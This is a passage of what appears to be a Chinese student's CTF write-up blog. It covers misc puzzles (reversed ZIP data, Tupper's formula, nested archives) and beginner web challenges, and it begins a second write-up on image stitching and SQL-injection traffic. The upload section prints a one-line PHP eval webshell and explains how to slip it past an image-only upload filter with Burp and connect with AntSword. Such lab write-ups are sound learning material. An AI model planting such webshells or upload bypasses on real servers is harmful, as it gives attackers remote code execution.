src="/./img/49277317_zbkF5bj7FzumpJmW/1729223301088-fb35ddee-ac94-4fa3-b435-8a1872481dc0-523713.png" alt="1729223301088-fb35ddee-ac94-4fa3-b435-8a1872481dc0.png"></p><p>看到末尾有个zip的反转数据，找一下末尾，然后导出逆向一下</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729223370400-117495c5-1652-4ed8-990a-83367bee1821-034993.png" alt="1729223370400-117495c5-1652-4ed8-990a-83367bee1821.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\wangzhanxiazai\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\wangzhanxiazai\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br>def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\wangzhanxiazai\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\wangzhanxiazai\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p>保存为zip文件</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729223942190-8d248a45-8dd8-4fae-b42e-8367902518af-840562.png" alt="1729223942190-8d248a45-8dd8-4fae-b42e-8367902518af.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729224309800-424057da-2621-4b59-97f7-59320be86700-836015.png" alt="1729224309800-424057da-2621-4b59-97f7-59320be86700.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729224338523-6a546d58-6e07-4673-9084-213f0d9db700-134879.png" alt="1729224338523-6a546d58-6e07-4673-9084-213f0d9db700.png"></p><p>也有相关的在线网站可以解</p><h3 id="tupperexp"><a href="#tupperexp" class="headerlink" title="tupperexp"></a>tupperexp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import numpy as np<br>import matplotlib.pyplot as plt<br>from PIL import Image<br><br><br>def Tupper_self_referential_formula(k):<br>    aa = np.zeros((17, 106))<br><br>    def f(x, y):<br>        y += k<br>        a1 = 2 ** -(-17 * x - y % 17)<br>        a2 = (y // 17) // a1<br>        return 1 if a2 % 2 &gt; 0.5 else 0<br><br>    for y in range(17):<br>        for x in range(106):<br>            aa[y, x] = f(x, y)<br>    return aa[:, ::-1]<br><br><br>k = 9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252<br><br><br>aa = Tupper_self_referential_formula(k)<br>plt.figure(figsize=(15, 10))<br>plt.imshow(aa, origin=&#x27;lower&#x27;)<br>plt.savefig(&quot;tupper.png&quot;)<br>img = Image.open(&#x27;tupper.png&#x27;)<br># 翻转<br>dst1 = img.transpose(Image.FLIP_LEFT_RIGHT).rotate(180)<br>plt.imshow(dst1)<br>plt.show()<br></code></pre></td></tr></table></figure><p>倒序一下数据再生成照片</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729224750548-493fc2ee-d29b-4516-bbee-15a2a4ba4c90-427459.png" alt="1729224750548-493fc2ee-d29b-4516-bbee-15a2a4ba4c90.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729224835166-4b726f7d-cfc4-499f-965e-7b22849313b9-240086.png" alt="1729224835166-4b726f7d-cfc4-499f-965e-7b22849313b9.png"></p><p>倒过来看一下</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1729224875926-91580a7e-50bc-446b-b08e-7231c15ccfa6-810668.png" alt="1729224875926-91580a7e-50bc-446b-b08e-7231c15ccfa6.png"></p><p>Cute_r1ght?}</p><h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a><font style="color:rgb(33, 37, 41);">Matryoshka</font></h2><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zipfile<br>import os<br>import shutil<br>import uuid<br><br>def extract_zip(zip_path, extract_to):<br>    &quot;&quot;&quot;解压缩指定的 ZIP 文件到指定目录&quot;&quot;&quot;<br>    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:<br>        zip_ref.extractall(extract_to)<br>    print(f&quot;Extracted: &#123;zip_path&#125; to &#123;extract_to&#125;&quot;)<br><br>def find_and_extract_zips(base_folder, temp_folder, output_folder):<br>    &quot;&quot;&quot;递归查找并解压所有 ZIP 文件&quot;&quot;&quot;<br>    for root, dirs, files in os.walk(base_folder):<br>        for file in files:<br>            file_path = os.path.join(root, file)<br>            if file.endswith(&#x27;.zip&#x27;):<br>                unique_folder = os.path.join(temp_folder, str(uuid.uuid4()))  # 创建唯一的临时文件夹<br>                os.makedirs(unique_folder, exist_ok=True)<br>                extract_zip(file_path, unique_folder)<br>                os.remove(file_path)  # 解压后删除 ZIP 文件<br>                print(f&quot;Deleted: &#123;file_path&#125;&quot;)<br>                # 在新解压出的目录中继续查找 ZIP 文件<br>                find_and_extract_zips(unique_folder, temp_folder, output_folder)<br>            else:<br>                # 将最里面的文件移动到输出文件夹<br>                destination_path = os.path.join(output_folder, file)<br>                shutil.move(file_path, destination_path)<br>                print(f&quot;Moved: &#123;file_path&#125; to &#123;destination_path&#125;&quot;)<br><br>if __name__ == &quot;__main__&quot;:<br>    input_folder = r&quot;D:\网站下载\exppy&quot;  # 指定包含嵌套 ZIP 文件的根目录<br>    temp_folder = r&quot;D:\临时解压文件夹&quot;  # 用于解压的临时目录<br>    output_folder = r&quot;D:\解压后的文件&quot;  # 所有文件提取到的目标文件夹<br>    os.makedirs(temp_folder, exist_ok=True)  # 确保临时目录存在<br>    os.makedirs(output_folder, exist_ok=True)  # 确保输出目录存在<br><br>    find_and_extract_zips(input_folder, temp_folder, output_folder)<br>    print(&quot;所有文件提取完毕&quot;)<br></code></pre></td></tr></table></figure><p>然后爆破密码</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722405394869-3053321d-2392-4bf1-831a-52ca60e4ea85-867432.png" alt="1722405394869-3053321d-2392-4bf1-831a-52ca60e4ea85.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722405509167-7ac1f6a2-d88f-47b7-870f-52683d7378e6-684452.png" alt="1722405509167-7ac1f6a2-d88f-47b7-870f-52683d7378e6.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722405565617-1b8e32f8-5cb4-4c41-b73b-3f8503c0b50a-108155.png" alt="1722405565617-1b8e32f8-5cb4-4c41-b73b-3f8503c0b50a.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722414218554-683f8729-2586-4d4a-8c6c-16ba93b8b717-629688.png" alt="1722414218554-683f8729-2586-4d4a-8c6c-16ba93b8b717.png"></p><p>改成zip然后解压缩</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722414251376-5ce7e95f-e361-4c91-970e-5a91af357fef-116017.png" alt="1722414251376-5ce7e95f-e361-4c91-970e-5a91af357fef.png"></p><p>然后就拿到照片不会了</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722416548417-646cec90-78b0-4b2b-916a-cecf412d9df2-976597.png" alt="1722416548417-646cec90-78b0-4b2b-916a-cecf412d9df2.png"></p><p><font style="color:#DF2A3F;">来自周神的万能py（伟大无需多言）</font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722418852200-7b993f45-1759-460b-83c0-ba5527519a17-771227.png" alt="1722418852200-7b993f45-1759-460b-83c0-ba5527519a17.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722418885797-0bb5ed61-03ad-4f1b-82b0-bae001f8c022-503479.png" alt="1722418885797-0bb5ed61-03ad-4f1b-82b0-bae001f8c022.png">\</p><p>sb0olI</p><p>WkpHU1VDVEZ7ODY1ODYzNkItNDJGMy0zNjQ4LTVCMjUtQUY2Q0RCRjI5NTI5fQ&#x3D;&#x3D;</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1722419785126-873c394b-a883-44e1-882b-acb89c8cf994-283303.png" alt="1722419785126-873c394b-a883-44e1-882b-acb89c8cf994.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>    highlight_file(__FILE__);<br>    error_log(0);<br>    include(&#x27;flag.php&#x27;);<br>    if(isset($_GET[&#x27;num&#x27;]))&#123;<br>        $num = $_GET[&#x27;num&#x27;];<br>        if(!preg_match(&#x27;/0/&#x27;, $num))&#123;<br>            if($num===&quot;4476&quot;)&#123;<br>                die(&quot;no no no!&quot;);<br>            &#125;<br>            if(intval($num,0)===4476)&#123;<br>                echo $flag;<br>            &#125;<br>        &#125;<br>    &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p><font style="color:#000000;">因为 intval 在处理以 0x 开头的字符串时会将其解释为十六进制数，所以可以通过传递 0x117c（十六进制的 4476）来绕过 $num&#x3D;&#x3D;&#x3D;”4476” 的检查，同时使 intval($num, 0)&#x3D;&#x3D;&#x3D;4476 成立，从而输出 $flag。</font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1717211988557-76dbdf02-6fe4-41b3-bf26-612eda5cc8a0-438149.png" alt="1717211988557-76dbdf02-6fe4-41b3-bf26-612eda5cc8a0.png"></p><p><font style="color:#000000;">可以通过构造 URL </font><a href="http://10.21.16.70:8903/"><font style="color:#000000;">http://10.21.16.70:8903/</font></a><font style="color:#000000;">&#x2F;?num&#x3D;0x117c 来利用这个漏洞，绕过类型和内容的检查，并获取 $flag 变量的内容。</font></p><p><font style="color:#000000;">但是本题目会筛选数字字符串的‘0’，而0x包含所以采用另外的方法</font></p><p><font style="color:#000000;"></font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1717219211635-446df797-cde5-4357-a0ec-281cffdc817c-678059.png" alt="1717219211635-446df797-cde5-4357-a0ec-281cffdc817c.png"></p><p><font style="color:rgb(77, 77, 77);">当某个数字被过滤时，</font><font style="color:#DF2A3F;">可以给它增加小数位来绕过</font><font style="color:rgb(77, 77, 77);">。</font></p><h2 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h2><p>安装phpstudy</p><p><a href="https://old.xp.cn/download.html">Windows版phpstudy下载 - 小皮面板(phpstudy) (xp.cn)</a></p><p>本地搭建网站</p><p><a href="https://www.bilibili.com/video/BV1Wk4y1u7As/?spm_id_from=333.337.search-card.all.click&vd_source=076e1e9de2e61963283715e603d3511c">一个视频教会你，如何在本地搭建php网站服务环境_哔哩哔哩_bilibili</a></p><p>创建一个目录，然后将www网站html放入目录中创建本地网站，访问local即可</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726649056395-466e38b3-a8b4-477d-8561-ae5fd5960ee7-176212.png" alt="1726649056395-466e38b3-a8b4-477d-8561-ae5fd5960ee7.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726649033149-d4233996-6fd9-4f88-b4ca-733b43ce3e02-633732.png" alt="1726649033149-d4233996-6fd9-4f88-b4ca-733b43ce3e02.png"></p><h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726648305354-71c4c6e6-08c4-4a73-9453-0c5904f8df6f-286234.png" alt="1726648305354-71c4c6e6-08c4-4a73-9453-0c5904f8df6f.png"></p><p>使用dirsearch扫描不出来</p><p>访问robots.txt</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726713885657-34c34ae4-bc26-4ea4-8d83-31fb26a56128-955571.png" alt="1726713885657-34c34ae4-bc26-4ea4-8d83-31fb26a56128.png"></p><p>访问他给的地址拿到flag</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726713913723-be0ad96f-387a-4153-8da7-4ebaf58ab313-301402.png" alt="1726713913723-be0ad96f-387a-4153-8da7-4ebaf58ab313.png"></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727011298547-ea72743a-3a21-4235-8e36-5c1653a42c24-263120.png" alt="1727011298547-ea72743a-3a21-4235-8e36-5c1653a42c24.png"></p><h2 id="垫刀之路01-MoeCTF？启动！（env查看环境变量"><a href="#垫刀之路01-MoeCTF？启动！（env查看环境变量" class="headerlink" title="垫刀之路01: MoeCTF？启动！（env查看环境变量)"></a>垫刀之路01: MoeCTF？启动！（env查看环境变量)</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726714080107-480c1886-1892-4979-8cd1-f99bb9aac24f-764988.png" alt="1726714080107-480c1886-1892-4979-8cd1-f99bb9aac24f.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726714153130-f47be931-3f19-44a0-9b04-fe42ec430fd1-596754.png" alt="1726714153130-f47be931-3f19-44a0-9b04-fe42ec430fd1.png"></p><p>查看根目录即可</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726714165241-aeffbd31-3eed-4282-94fb-b0a4f036bcbe-766151.png" alt="1726714165241-aeffbd31-3eed-4282-94fb-b0a4f036bcbe.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1726714203277-69ab34f4-de23-48d3-b431-8b82da9ab99b-361821.png" alt="1726714203277-69ab34f4-de23-48d3-b431-8b82da9ab99b.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1727011454324-90ae74df-471b-45e6-8091-3e17f4b0e7cb-984921.png" alt="1727011454324-90ae74df-471b-45e6-8091-3e17f4b0e7cb.png"></p><h2 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723788922732-8cdc0929-a1fe-4ac2-b28d-23805546930c-025602.png" alt="1723788922732-8cdc0929-a1fe-4ac2-b28d-23805546930c.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723788908960-1c2fb903-1dbc-4e78-80b4-bf7b773a547a-943041.png" alt="1723788908960-1c2fb903-1dbc-4e78-80b4-bf7b773a547a.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723789577517-e99d9957-f220-438a-8ca0-67e581712d40-890175.png" alt="1723789577517-e99d9957-f220-438a-8ca0-67e581712d40.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723792218249-f2dc7631-e715-4806-8082-109fe46a23e2-910058.png" alt="1723792218249-f2dc7631-e715-4806-8082-109fe46a23e2.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723792234932-c1f630e2-3618-4624-9e59-82e523a49066-213538.png" alt="1723792234932-c1f630e2-3618-4624-9e59-82e523a49066.png"></p><h2 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723793117335-90f7fdf9-d544-40a0-9f16-6df23d6f99ef-929429.png" alt="1723793117335-90f7fdf9-d544-40a0-9f16-6df23d6f99ef.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723793465236-77f3632f-e936-41b1-876d-a19eefd19df9-876660.png" alt="1723793465236-77f3632f-e936-41b1-876d-a19eefd19df9.png"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723793619918-61fa78e3-90d2-4264-b5ec-08fd3264848f-813252.png" alt="1723793619918-61fa78e3-90d2-4264-b5ec-08fd3264848f.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a><font style="color:#DF2A3F;background-color:#FBDE28;"><?php @eval($_POST['cmd']); ?></font></h3><p><font style="color:#000000;"><?php?>是php的固定规范写法</font></p><p><font style="color:#000000;">@表示后面如果执行错误不会报错</font></p><p><font style="color:#000000;">eval()函数表示</font><font style="color:#000000;background-color:#FBDE28;">括号里的语句字符串为执行代码</font></p><p><font style="color:#000000;">&amp;_POST[‘cmd’]表示从页面中以post方式接受变量cmd</font></p><p><font style="color:#000000;">cmd是蚁剑的连接密码</font></p><p><font style="color:#000000;"></font></p><h3 id="先写一句木马，传入木马文件"><a href="#先写一句木马，传入木马文件" class="headerlink" title="先写一句木马，传入木马文件"></a>先写一句木马，<font style="color:#000000;">传入木马文件</font></h3><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723793726319-06f98ac9-7278-49b7-a3e1-a1951becb0a9-583287.png" alt="1723793726319-06f98ac9-7278-49b7-a3e1-a1951becb0a9.png"></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1723793808260-a92db341-64ba-4d90-aa56-bfcbb256be6a-769450.png" alt="1723793808260-a92db341-64ba-4d90-aa56-bfcbb256be6a.png"></p><p>要上传照片，所以改成jpg</p><p>然后用burp抓包截取，将改成php（像这样）</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534-009062.webp" alt="1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534.png"></p><p>传入后连接蚁剑</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724042980823-00939c02-4eff-42fd-9929-36f5395bc6ba-452820.png" alt="1724042980823-00939c02-4eff-42fd-9929-36f5395bc6ba.png"></p><p><font style="color:#DF2A3F;">这里的意思是将传入的文件保存到uploads目录下面</font></p><p><font style="color:#DF2A3F;">注意他这里要访问到传入php的文件地址</font></p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724042938596-0786a2be-f5b2-402d-8ed3-619a9ab39bf0-414518.png" alt="1724042938596-0786a2be-f5b2-402d-8ed3-619a9ab39bf0.png"></p><p>测试连接成功后就可以查找flag了，就在根目录下面</p><p><img src="/./img/49277317_zbkF5bj7FzumpJmW/1724043316235-079eff0b-6067-4002-807c-b972a96ba727-961810.png" alt="1724043316235-079eff0b-6067-4002-807c-b972a96ba727.png"></p><h1 id="心得体会"><a href="#心得体会" class="headerlink" title="心得体会"></a>心得体会</h1><p>misc也不是最近学的了，反正也就学了一点东西，东西也特别杂，稍微总结一下：</p><p>基础：文件头格式，文件倒序</p><p>编码：base(16 32 64 85 36 58 91 92 62 <font style="color:#DF2A3F;">2048</font>)，Cimbar,ook,</p><p>加解密：雪加密， zip加密（真伪加密），爆破密钥（自定义密钥），明文攻击</p><p>隐写：</p><p>音频隐写：</p><p>图片隐写：</p><p>misc和web学的东西很杂，特别是misc，而且更新变化的很快，感觉misc打的更多是取证这些，在正规比赛上，一般简单题都只出现在线上那些平台举办的新生赛上，比如moe，base，syc，0xgame这些都是新生赛的难度，misc考的不是很难，之前几年确实还是misc和pwn比较重要，按今年的趋势，可能越发均衡了，密码是保底的关键</p><p>我主要还是re手（不敢说自己是re手）misc和web主要还是平时无聊的时候打一下，因为re学的有时候挺累的，不过还是积累了很多知识，虽然这个方向学了一年了，但在大型的正规比赛上还是拿不了分数，只能说还不够，比如省赛国赛，哈工大的比赛，有时候虽然有思路，但还是没有勇气做下去</p><p>如果要re的题目话，可以拿出来好多，只要misc和web的话比较有质量的题目可能就没那么多了，希望老师体谅一下，</p><blockquote><p>更新: 2025-01-02 11:02:51<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/eptego26gzgchtga">https://www.yuque.com/chaye-apqbl/vsc85q/eptego26gzgchtga</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/Polis_wp%E5%A4%A7%E4%B8%80%E4%B8%8B%E9%9B%86%E8%AE%AD/"/>
    <url>/2026/01/19/WP/2024/Polis_wp%E5%A4%A7%E4%B8%80%E4%B8%8B%E9%9B%86%E8%AE%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="Polis-wp-大一下集训"><a href="#Polis-wp-大一下集训" class="headerlink" title="Polis_wp 大一下集训"></a>Polis_wp 大一下集训</h1><h2 id="可叹落叶飘零"><a href="#可叹落叶飘零" class="headerlink" title="可叹落叶飘零"></a>可叹落叶飘零</h2><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713364898233-44a2b52d-0cc9-45f4-9f3e-d5d785e1d392-814455.png" alt="1713364898233-44a2b52d-0cc9-45f4-9f3e-d5d785e1d392.png"></p><p>1、先进行修改时间排序照片</p><p>2、有100张照片，可以猜一下是5<em>20还是10</em>10的拼接方式</p><p>3、自己手动拼接后发现是10*10的拼接方式</p><p>4、这里其实可以直接手搓出信息</p><p>5、科学方法，用chat和python写出拼接代码</p><p>6、这里附上python代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>from PIL import Image<br><br># 指定图片文件夹路径<br>folder_path = &quot;D:\\flag\\可叹，落叶飘零&quot;<br><br># 获取文件夹中所有png图片文件的路径<br>png_files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if f.endswith(&#x27;.png&#x27;)]<br><br># 按照修改日期排序文件列表<br>png_files.sort(key=lambda x: os.path.getmtime(x))<br><br># 动态计算新的大图片尺寸<br>total_images = len(png_files)<br>columns = 10<br>rows = (total_images + columns - 1) // columns<br>max_width = max_height = 0<br><br>for png_file in png_files:<br>    img = Image.open(png_file)<br>    width, height = img.size<br>    max_width = max(max_width, width)<br>    max_height = max(max_height, height)<br><br>result_width = max_width * columns<br>result_height = max_height * rows<br><br># 创建一个新的大图片<br>result_image = Image.new(&quot;RGB&quot;, (result_width, result_height))<br><br># 逐行拼接图片<br>x_offset = y_offset = 0<br>for idx, png_file in enumerate(png_files):<br>    img = Image.open(png_file)<br>    result_image.paste(img, (x_offset, y_offset))<br>    x_offset += max_width<br>    if (idx + 1) % columns == 0:<br>        x_offset = 0<br>        y_offset += max_height<br><br># 保存拼接后的图片<br>result_image.save(&quot;result_image.png&quot;)<br><br>print(&quot;图片拼接完成！&quot;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713365173359-0cc990ef-fe0c-42de-9a9f-0c8698454679-017815.png" alt="1713365173359-0cc990ef-fe0c-42de-9a9f-0c8698454679.png"></p><p>7、这里得到信息，文字识别不了，可能因为分辨率太低了，选择手搓</p><p>8、不过提交发现并不是flag，所以这里猜测可能进行了base加密</p><p>注意：可能会把l看成大I，如果是大I的话会解出乱码，试错后发现是l而不是大I</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713365347507-7e020a07-6f8c-4607-84ff-fdb4a2286bde-852261.png" alt="1713365347507-7e020a07-6f8c-4607-84ff-fdb4a2286bde.png"></p><p>9、进行解密后得到flag</p><h2 id="手搓之神or脚本之神"><a href="#手搓之神or脚本之神" class="headerlink" title="手搓之神or脚本之神"></a>手搓之神or脚本之神</h2><p>1、用wireshark打开，按时间顺序进行请求方式的筛选  </p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713449882159-4259fe5b-8fc1-4574-b533-7be382b68416-385725.webp" alt="1713449882159-4259fe5b-8fc1-4574-b533-7be382b68416.png"></p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713449967995-19d6ee84-4747-4cd8-9f1b-53d5070a256b-373984.webp" alt="1713449967995-19d6ee84-4747-4cd8-9f1b-53d5070a256b.png"></p><p>2、分析数据流，他是在进行sql碰撞得到flag的每一位ascll码，最后一次请求即为碰撞成功的ascll码值<br>3、转成字母数字得到flag<br>4、手搓之神有待python代码附上</p><h2 id="xor-签到题"><a href="#xor-签到题" 